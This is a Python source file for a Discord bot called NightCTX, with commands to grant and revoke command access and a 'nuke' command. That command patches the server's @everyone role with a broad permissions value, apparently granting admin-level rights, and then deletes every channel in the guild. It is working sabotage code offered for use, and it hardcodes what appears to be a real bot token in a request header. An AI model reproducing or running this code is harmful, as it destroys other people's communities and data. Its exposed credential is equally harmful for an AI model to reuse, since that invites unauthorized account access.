import interactions
import requests
import subprocess

token = ""
joined_channels = []
bot = interactions.Client(token, intents=interactions.Intents.DEFAULT)
access_to_commands = []

@bot.command(
    name="addperms",
    description="grant access to some of bot commands to people",
        options=[
        interactions.Option(
            name="user",
            description="user",
            type=interactions.OptionType.USER,
            required=True,
        )
    ]
)
async def grant_access(ctx: interactions.CommandContext, user):
    if int(ctx.author.id) == 1005930591604199444:
        access_to_commands.append(user.id)
        await ctx.send(f"Successfully gave command perms to <@{user.id}>!")
    elif int(user.id) == int(ctx.author.id):
        await ctx.send("Nice try but no.")
    else:
        await ctx.send("Only bot owner can do that.")

@bot.command(
    name="rmperms",
    description="Remove access to some of bot commands from people",
        options=[
        interactions.Option(
            type=interactions.OptionType.USER,
            name="user",
            description="user",
            required=True
        )
    ]
)

async def remove_access(ctx: interactions.CommandContext, user):
    if int(ctx.author.id) == 1005930591604199444:
        if int(user.id) == 1005930591604199444 and int(ctx.author.id) != 1005930591604199444:
            await ctx.send("You cannot remove command perms.")
            return
        if int(user.id) == 1005930591604199444 and int(ctx.author.id) == 1005930591604199444:
            await ctx.send("You cannot remove command perms.")
            return
        else:
            if int(user.id) in access_to_commands:
                access_to_commands.remove(int(user.id))
            else:
                await ctx.send(f"{user.username}#{user.discriminator} doesn't have command perms already!")
                return

            await ctx.send(f"Successfully removed command perms from <@{user.id}>!")

@bot.command(
    name="logs",
    description="view who has access to some of bot commands",
)
async def view_access(ctx: interactions.CommandContext):
    embed = interactions.Embed(title="People who have command perms")
    for userid in access_to_commands:
        user = await interactions.get(bot, interactions.User, object_id=userid)
        embed.add_field(name=f"{user.username}#{user.discriminator}", value=f"ID: {userid}")
    await ctx.send(embeds=embed)

@bot.command(
    name="info",
    description="info about this bot basically"
)
async def info(ctx: interactions.CommandContext):
    await ctx.send('***NightCTX Version 2.0***, made by **0xyf77** and **duckyes**')
    await ctx.send(f"https://discord.gg/NZ2j89eJgz")


########## NUKING ##########
@bot.command(
    name="nuke",
    description="WARNING WARNING WARNING!!!!! USE THIS WITH CAUTION"
)
async def nuke(ctx: interactions.CommandContext):
    if int(ctx.author.id) not in access_to_commands:
        await ctx.send("You are not allowed to use this command.")
        return
    await ctx.send("Kickstarting command...")
    guild_id = ctx.guild.id
    everyone = None
    for role in ctx.guild.roles:
        if role.name == '@everyone':
            everyone = role
            break
    default_role_id = everyone.id
    url = f"https://discord.com/api/v9/guilds/{guild_id}/roles/{default_role_id}"

    headers = {
        "Content-Type": "application/json",
        "Authorization": "Bot MTA0ODY4MTI2MzMwNjg5OTQ3Ng.GCPYuy.V3mFZ3Utvdj2V5XcRbqn7Px2UQAUp1_iX24Dwo"
    }

    data = {
        "color": 0,
        "hoist": False,
        "mentionable": False,
        "name": "@everyone",
        "permissions": "6546771529"
    }

    response = requests.patch(url, headers=headers, json=data)

    if response.status_code == 200:
        print(f"admin perms given")
    else:
        print(f"failed to give admin perms")

    for channel in ctx.guild.channels:
      try:
        await channel.delete()
        print(f"{channel.name} was deleted.")
      except:
        print(f"{channel.name} was NOT deleted.")
    await ctx.send(f"Nuked {ctx.guild} successfully!")
